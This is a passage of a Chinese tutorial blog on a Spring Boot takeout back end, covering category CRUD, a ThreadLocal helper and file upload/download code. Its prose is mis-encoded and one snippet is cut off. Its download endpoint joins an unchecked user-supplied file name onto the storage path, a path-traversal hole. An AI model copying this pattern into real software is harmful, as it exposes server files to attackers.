/>æˆ‘é€‰æ‹©åœ¨Utilsä¸‹åˆ›å»º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * åŸºäºThreadLocalå°è£…å·¥å…·ç±»ï¼Œç”¨æˆ·ä¿å­˜å’Œè·å–å½“å‰ç™»å½•ç”¨æˆ·id</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseContext</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Long&gt; threadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * è®¾ç½®å€¼</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> id</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCurrentId</span><span class="hljs-params">(Long id)</span>&#123;<br>        threadLocal.set(id);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * è·å–å€¼</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    pub<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼ŒThreadLocalä¸æ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œåªæœ‰åŒä¸€ä¸ªçº¿ç¨‹æ‰èƒ½æ‹¿åˆ°ï¼Œä¸æ˜¯ä¸€ä¸ªçº¿ç¨‹æ‹¿ä¸åˆ°çš„</p></blockquote><h3 id="è¿™æ ·ä¹Ÿè¡Œ"><a class="markdownIt-Anchor" href="#è¿™æ ·ä¹Ÿè¡Œ"></a> è¿™æ ·ä¹Ÿè¡Œ</h3><p>æ¢ä¸ªæ€è·¯ï¼šå› ä¸ºæˆ‘æƒ³æ‹¿Requestå¯¹è±¡é‡Œçš„Idå˜›ï¼Œæ‰€ä»¥ï¼Œåªè¦æœ‰Requestçš„idå°±è¡Œï¼Œä¸å¿…è¿‡äºæ‰§ç€ä¸€å®šè¦ç”¨ThreadLocalæ¥å­˜ï¼Œå› æ­¤ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©æ³¨å…¥ä¸€ä¸‹HttpServletRequestå¯¹è±¡æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/58b8b8d5442a4da29ef667430a521262.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h1 id="åˆ†ç±»ç®¡ç†é¡µé¢"><a class="markdownIt-Anchor" href="#åˆ†ç±»ç®¡ç†é¡µé¢"></a> åˆ†ç±»ç®¡ç†é¡µé¢</h1><h2 id="èœå“åˆ†ç±»"><a class="markdownIt-Anchor" href="#èœå“åˆ†ç±»"></a> èœå“åˆ†ç±»</h2><h3 id="èœå“åˆ†ç±»å±•ç°"><a class="markdownIt-Anchor" href="#èœå“åˆ†ç±»å±•ç°"></a> èœå“åˆ†ç±»å±•ç°</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9dc65e03155d4e29b1dd85b73e79468c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿˜æ˜¯é‚£å‡ æ­¥</p><pre><code class="hljs">1. åˆ›å»ºåˆ†é¡µæ„é€ å™¨ Page pageInfo = new Page(ç¬¬å‡ é¡µ,æ¯é¡µå‡ æ¡æ•°æ®);2. å¦‚æœæœ‰éœ€è¦æ¡ä»¶è¿‡æ»¤çš„åŠ å…¥æ¡ä»¶è¿‡æ»¤å™¨LambaQueryWarpper3. æ³¨å…¥çš„serviceå¯¹è±¡ï¼ˆå·²ç»ç»§æ‰¿MPçš„BaseMapperæ¥å£ï¼‰å»è°ƒç”¨Pageå¯¹è±¡     serviceå¯¹è±¡.page(åˆ†é¡µä¿¡æ¯,æ¡ä»¶è¿‡æ»¤å™¨)4. è¿”å›ç»“æœå°±å¯ä»¥äº†</code></pre><p>åˆ†é¡µæŸ¥è¯¢ä½ç½®ï¼š<code>com.xyy.controller.CategoryController.page</code></p><h3 id="æ–°å¢èœå“åˆ†ç±»"><a class="markdownIt-Anchor" href="#æ–°å¢èœå“åˆ†ç±»"></a> æ–°å¢èœå“åˆ†ç±»</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2c38b870546f49bd9a9d00572c2f1578.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>æ¶‰åŠçš„è¡¨æœ‰åˆ†ç±»è¡¨category<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5c9af552c151402d99d419b44601110a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¸šåŠ¡æµç¨‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0e55226139a848f4ba8a792c62a6feb3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>è¯·æ±‚æ–¹å¼æ˜¯Postè¯·æ±‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d43ee4cb2aeb4259abe4129cb1672978.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dc4cdb56b1ff40039d61b044f0259ea4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ§åˆ¶å™¨ä½ç½®ï¼š<code>com.xyy.controller.CategoryController (save)</code></p><h3 id="åˆ é™¤èœå“åˆ†ç±»"><a class="markdownIt-Anchor" href="#åˆ é™¤èœå“åˆ†ç±»"></a> åˆ é™¤èœå“åˆ†ç±»</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d3c5ede5188a46caa8bef24e4c14b9fb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e35caef5f5d8421aae24cfc2832fe3d0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ™®é€šç‰ˆæœ¬ï¼Œæ²¡æœ‰è€ƒè™‘åˆ†ç±»æœ‰å…³è”çš„æƒ…å†µ</p><blockquote><p>æ³¨æ„</p></blockquote><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå‰ç«¯ä¼ è¿‡æ¥çš„è¯·æ±‚æ˜¯</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125153246807.png" alt="image-20221125153246807" /></p><p>å‚æ•°åå­—æ˜¯ <strong>ids</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/62d820a820634bcc841b41bcc0bc3987.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å®Œå–„ä¸€ä¸‹ï¼Œ <strong>å¦‚æœå½“å‰èœå“åˆ†ç±»ä¸‹æœ‰èœå“çš„è¯ ï¼Œå°±ä¸è®¸åˆ é™¤</strong><br />æ‰€ä»¥åœ¨åˆ é™¤ä¹‹å‰è¦å…ˆåšåˆ¤æ–­æ‰å¯ä»¥åˆ é™¤ï¼Œä¸ç¬¦åˆæ¡ä»¶çš„ï¼Œæˆ‘ä»¬è¦æŠ›å‡ºå¼‚å¸¸è¿›è¡Œæç¤º<br />å› ä¸ºæ²¡æœ‰è¿”å›å¼‚å¸¸ä¿¡æ¯çš„ç±»ï¼Œæˆ‘ä»¬è¿™é‡Œè¦åšä¸€ä¸ªè‡ªå®šä¹‰çš„ä¸“é—¨è¿”å›å¼‚å¸¸ä¿¡æ¯çš„ç±»<code>CustomerException</code><br />è¿™ä¸ªç±»çš„ä½ç½®ä¹Ÿåœ¨commonåŒ…ä¸‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/40de841c594443398553b1509512fa5e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å› ä¸ºæˆ‘ä»¬ä¹‹å‰åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€å¼‚å¸¸å¤„ç†ï¼Œä¹Ÿè¦ç”¨ä¸Šï¼Œå› ä¸ºè¦æ‹¦æˆªå¼‚å¸¸ç»Ÿä¸€å¤„ç†<br />è¿˜æ˜¯<code>com.xyy.common.GloableExceptionHandler</code><br />å¯¹æŠ›å‡ºå¼‚å¸¸è¿›è¡Œå¤„ç†ï¼Œå°±å¯ä»¥å¯¹æ–°å¢çš„å¼‚å¸¸æä¾›ç›®æ ‡çš„æ‹¦æˆªå’Œå¼‚å¸¸é€šçŸ¥<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/035d8b14a54f4cb1bffcd4c63673d0f8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åˆ é™¤èœå“åˆ†ç±»çš„controlleræ¥å£åœ¨ï¼š<code>com.xyy.controller.CategoryController (delCategory)</code><br />å› ä¸ºä¸šåŠ¡ç‰¹æ®Šï¼Œä¸”æ¯”è¾ƒé•¿ï¼Œå°±åˆ†ç¦»å‡ºæ¥æŠŠä¸šåŠ¡æ”¾åœ¨serviceåŒ…ä¸‹<br />serviceæ¥å£ä½ç½®ï¼š<code>com.xyy.service.impl.CategoryServiceImpl (removeCategory)</code></p><h2 id="ä¿®æ”¹å¥—é¤ä¿¡æ¯"><a class="markdownIt-Anchor" href="#ä¿®æ”¹å¥—é¤ä¿¡æ¯"></a> ä¿®æ”¹å¥—é¤ä¿¡æ¯</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e6c29b9b209c4881815bdffa24f571e8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />éå¸¸ç®€å•çš„CRUDï¼Œç›´æ¥è°ƒç”¨MPæ›´æ–°ä¸€ä¸‹å°±è¡Œ<br />APIä½ç½®</p><p>â€‹<br />â€‹    com.xyy.controller.CategoryController (updateCategory)</p><h2 id="æ–‡ä»¶ä¸Šä¼ ä¸‹è½½é‡ç‚¹"><a class="markdownIt-Anchor" href="#æ–‡ä»¶ä¸Šä¼ ä¸‹è½½é‡ç‚¹"></a> æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ï¼ˆé‡ç‚¹ï¼‰</h2><h3 id="ä¸Šä¼ é€»è¾‘"><a class="markdownIt-Anchor" href="#ä¸Šä¼ é€»è¾‘"></a> ä¸Šä¼ é€»è¾‘</h3><p>ç¬¬ä¸€æ¬¡æ¥è§¦ä¸Šä¼ å’Œä¸‹è½½çš„åŠŸèƒ½<br />æ–‡ä»¶ä¸Šä¼ é€»è¾‘ï¼ˆåç«¯ï¼‰<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/6fddfbb6992645358dd6f7fc9e7ed79d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å‚æ•°åæœ‰è¦æ±‚çš„<br />æ¥æ”¶çš„æ–‡ä»¶ç±»å‹ä¸€å®šæ˜¯ æ–¹æ³•å(MultipartFile å‰ç«¯ä¸Šä¼ çš„æ–‡ä»¶åç§°)<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dee0540b7de5467ea6695e058a833b7f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b0f446d645654cd89577b9ba0a369f34.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ‰€ä»¥åç«¯çš„æ¥æ”¶åå­—ä¹Ÿå¾—æ”¹ä¸ºfile<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8d04a387872f43f199fadcd1d2c79090.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="ä¸Šä¼ é€»è¾‘å®ç°"><a class="markdownIt-Anchor" href="#ä¸Šä¼ é€»è¾‘å®ç°"></a> ä¸Šä¼ é€»è¾‘å®ç°</h3><p>å…·ä½“çš„å­˜å‚¨è·¯å¾„å†™åœ¨é…ç½®æ–‡ä»¶é‡Œäº†</p><ol><li><p>application.yml</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125185250894.png" alt="image-20221125185250894" /></p></li><li><p><strong>controller</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java">RestController<br><span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonController</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;takeOutFile.fileLocation:&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String filePath;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ–‡ä»¶ä¸Šä¼ </span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> file org.springframework.web.multipart.MultipartFile</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> com.xyy.reggie.common.R&lt;java.lang.String&gt;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span> &#123;<br><br>        <span class="hljs-comment">//åŸå§‹æ–‡ä»¶å</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br>        <span class="hljs-keyword">assert</span> originalFilename != <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">suffix</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));<br><br>        <span class="hljs-comment">//ä½¿ç”¨UUIDé‡æ–°ç”Ÿæˆæ–‡ä»¶åï¼Œé˜²æ­¢æ–‡ä»¶åç§°é‡å¤é€ æˆæ–‡ä»¶è¦†ç›–</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString() + suffix;<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªç›®å½•å¯¹è±¡</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath);<br>        <span class="hljs-comment">//åˆ¤æ–­å½“å‰ç›®å½•æ˜¯å¦å­˜åœ¨</span><br>        <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>            <span class="hljs-comment">//ç›®å½•ä¸å­˜åœ¨ï¼Œéœ€è¦åˆ›å»º</span><br>            dir.mkdirs();<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir.getAbsolutePath() +File.separator+ fileName));<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> R.success(fileName);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ–‡ä»¶ä¸‹è½½</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name     java.lang.String</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> response javax.servlet.http.HttpServletResponse</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è¾“å…¥æµï¼Œé€šè¿‡è¾“å…¥æµè¯»å–æ–‡ä»¶å†…å®¹</span><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath +File.separator+  name));<br><br>            <span class="hljs-comment">//è¾“å‡ºæµï¼Œé€šè¿‡è¾“å‡ºæµå°†æ–‡ä»¶å†™å›æµè§ˆå™¨</span><br>            <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><br>            response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>) &#123;<br>                outputStream.write(bytes, <span class="hljs-number">0</span>, len);<br>                outputStream.flush();<br>            &#125;<br><br>            <span class="hljs-comment">//å…³é—­èµ„æº</span><br>            outputStream.close();<br>            fileInputStream.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125185348635.png" alt="image-20221125185348635" /></p></li></ol><blockquote><p>SpringBootæ–‡ä»¶ä¸Šä¼ ä¸‹è½½æ€ä¹ˆä½¿ç”¨å°±ä¸è¯´äº†ï¼Œè¯´è¯´æ€ä¹ˆä½¿ç”¨<strong>ç›¸å¯¹è·¯å¾„</strong>æŠŠæ–‡ä»¶å­˜å‚¨åˆ°é¡¹ç›®æ ¹ç›®å½•å»</p></blockquote><ol start="4"><li><p>ä»£ç åˆ†æ</p><ol><li><p>æˆ‘ä»¬ä½¿ç”¨<code>MultipartFileçš„transferTo()</code>è¿›è¡Œæ–‡ä»¶æœ¬åœ°æŒä¹…åŒ–</p></li><li><p>ä½†æ˜¯<code>MultipartFileçš„transferTo()</code>æ–¹æ³•ä¼šç›‘æµ‹ä¼ å…¥å…¶ä¸­çš„Fileå¯¹è±¡çš„è·¯å¾„æ˜¯å¦ä¸ºç»å¯¹è·¯å¾„ï¼Œå¦‚æœä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œ<mark>ä¼šè‡ªåŠ¨æ‹¼æ¥applicationé‡Œè®¾ç½®çš„è·¯å¾„ å’Œ \work\Tomcat\localhost\ROOT</mark>ã€‚</p><p>æ‰€ä»¥å‡ºç°</p><p>java.io.FileNotFoundException: C:\Users\XXX\AppData\Local\Temp\tomcat.8080.6103676472064121995\work\Tomcat\localhost\ROOT\src\main\resources\takeOutFiled10b193c1-c840-4570-88c3-874ef18e73b5.png (ç³»ç»Ÿæ‰¾ä¸åˆ°æŒ‡å®šçš„è·¯å¾„ã€‚)</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125190148520.png" alt="image-20221125190148520" style="zoom: 100%;" /></li><li><p>åªè¦ç»™å®ƒä¸€ä¸ªç»å¯¹è·¯å¾„å°±å¯ä»¥äº†</p></li><li><p><code>file.transferTo(new File(dir.getAbsolutePath() +File.separator+ fileName));</code></p><p><code>dir.getAbsolutePath()</code> å¾—åˆ°å‚¨å­˜æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„</p><p><code>File.separator</code> å°±æ˜¯   <strong>/</strong></p><p><code>fileName</code> ä½ è¦å­˜å‚¨çš„æ–‡ä»¶å</p></li></ol></li></ol><p>å…·ä½“ä½ç½®åœ¨<code>com.xyy.controller.CommonController (upLoadFile)</code></p><h3 id="ä¸‹è½½é€»è¾‘"><a class="markdownIt-Anchor" href="#ä¸‹è½½é€»è¾‘"></a> ä¸‹è½½é€»è¾‘</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9748d9f84a224b329f2035afcf31091d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å›¾ç‰‡å›æ˜¾åŠŸèƒ½<br />ç”¨åˆ°äº†è¾“å…¥è¾“å‡ºæµ<br />ä½ç½®ï¼š<code>com.xyy.controller.CommonController (fileDownload)</code></p><h1 id="èœå“ç®¡ç†é¡µé¢"><a class="markdownIt-Anchor" href="#èœå“ç®¡ç†é¡µé¢"></a> èœå“ç®¡ç†é¡µé¢</h1><h2 id="æ–°å¢èœå“"><a class="markdownIt-Anchor" href="#æ–°å¢èœå“"></a> æ–°å¢èœå“</h2><h3 id="éœ€æ±‚åˆ†æ"><a class="markdownIt-Anchor" href="#éœ€æ±‚åˆ†æ"></a> éœ€æ±‚åˆ†æ</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/307c50613cf9427eb8af9ca1edf35f10.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ¶‰åŠè¡¨ä¸ºdishå’Œdish_flavor<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2bee4656682c429093d0b487f7453028.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¼€å‘é€»è¾‘<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0c69f61ce4e84e87b2f70cef256a597c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="æ–°å¢å®ç°"><a class="markdownIt-Anchor" href="#æ–°å¢å®ç°"></a> æ–°å¢å®ç°</h3><p>ç”±äºæ˜¯å¤šè¡¨çš„æ“ä½œï¼ŒMPç›´æ¥å¹²è‚¯å®šä¸è¡Œï¼Œæ‰€ä»¥å°±æŠŠserviceå±‚æŠ½ç¦»å‡ºæ¥è¿›è¡Œå¤„ç†</p><p>è¿˜æœ‰ï¼Œå› ä¸ºæ¶‰åŠä¸¤å¼ è¡¨ï¼Œè¿™é‡Œè¿˜è¦åŠ å…¥äº‹åŠ¡è¿›è¡Œæ§åˆ¶ï¼Œé˜²æ­¢å¤šè¡¨æ“ä½œå´©æºƒ</p><p>â€‹    å¤šè¡¨æ“ä½œåªèƒ½ä¸€ä¸ªä¸€ä¸ªæ¥ï¼ŒMPæ²¡æœ‰åŠæ³•ä¸€æ¬¡æ€§æ“ä½œå¤šå¼ è¡¨<br />â€‹    å› ä¸ºæ¶‰åŠåˆ°å¤šè¡¨çš„é—®é¢˜ï¼Œæ‰€ä»¥è¿˜è¦åŠ å…¥æ³¨è§£æ¥å¤„ç†äº‹åŠ¡<br />â€‹    @Transactional å¼€å¯äº‹åŠ¡<br />â€‹    @EnableTransactionManagement åœ¨å¯åŠ¨ç±»åŠ å…¥ï¼Œæ”¯æŒäº‹åŠ¡å¼€å¯</p><p>Controllerä½ç½®ï¼š<code>com.xyy.controller.DishController (addDish)</code><br />Serviceä½ç½®ï¼š<code>com.xyy.service.DishService</code><br />ServiceImplä½ç½®ï¼š<code>com.xyy.service.impl.DishServiceImpl (addDishWithFlavor)</code></p><h3 id="æ–°å¢èœå“ä¹‹è·å–èœå“ç§ç±»"><a class="markdownIt-Anchor" href="#æ–°å¢èœå“ä¹‹è·å–èœå“ç§ç±»"></a> æ–°å¢èœå“ä¹‹è·å–èœå“ç§ç±»</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/260620e272564731a10cf74b24d47b95.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä»å‰ç«¯æ¥æ”¶ä¸€ä¸ªtype=1çš„æ ‡æ³¨ï¼Œç›®çš„æ˜¯åœ¨åˆ†ç±»è¡¨ä¸­ï¼Œèœå“åˆ†ç±»æ˜¯1ï¼Œå¥—é¤åˆ†ç±»æ˜¯2ï¼ŒæŠŠäºŒè€…åŒºåˆ†å¼€ï¼Œè·å–æ‰€æœ‰çš„èœå“ç±»å‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c139415e958e4a4d81a9687d3f04a524.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä½ç½®ï¼š<code>com.xyy.controller.CategoryController ï¼ˆlistCategoryï¼‰</code></p><h3 id="èœå“åˆ†é¡µ"><a class="markdownIt-Anchor" href="#èœå“åˆ†é¡µ"></a> èœå“åˆ†é¡µ</h3><p>é¡ºæ‰‹æŠŠèœå“åˆ†é¡µä¹Ÿåšäº†ï¼Œä¸å†™å¤ªå¤šäº†ï¼Œä½ç½®åœ¨ï¼š<code>com.xyy.controller.CategoryController ï¼ˆdishPageï¼‰</code><br />è®°å½•ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå¦‚æœè¯´åç«¯æ²¡æœ‰ç±»å’Œå‰ç«¯è¦çš„æ•°æ®å¯¹åº”ï¼Œé‚£ä¹ˆè‡ªå·±å°±å¯ä»¥å°è£…ä¸€ä¸ªç±»æ¥å¯¹å‰ç«¯ç‰¹æ®Šéœ€è¦çš„æ•°æ®è¿›è¡Œå°è£…</p><h2 id="dtoå¯¹è±¡"><a class="markdownIt-Anchor" href="#dtoå¯¹è±¡"></a> DTOå¯¹è±¡</h2><p>è¿™ä¸ªç±»å¯ä»¥æ˜¯å¯¹ä¸€äº›å®ä½“ç±»è¿›è¡Œæ‰©å±•ï¼Œç»§æ‰¿äºæŸä¸ªçˆ¶ç±»ï¼Œå†æ·»åŠ ä¸€äº›å†…å®¹<br />æ¯”å¦‚Dishå’ŒDishDto<br />DishDtoå°±ç»§æ‰¿äºDishç±»ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œäº†æ‰©å±•<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c20e2473b88b49f684764ddab99f9cfb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a365d359125f498799f4b96a8e43fd0a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="æ›´æ–°èœå“ä¿¡æ¯"><a class="markdownIt-Anchor" href="#æ›´æ–°èœå“ä¿¡æ¯"></a> æ›´æ–°èœå“ä¿¡æ¯</h2><p>å°±æ˜¯ä¸ªupdate<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e48ab4407978498d8321be25c5da40a0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br 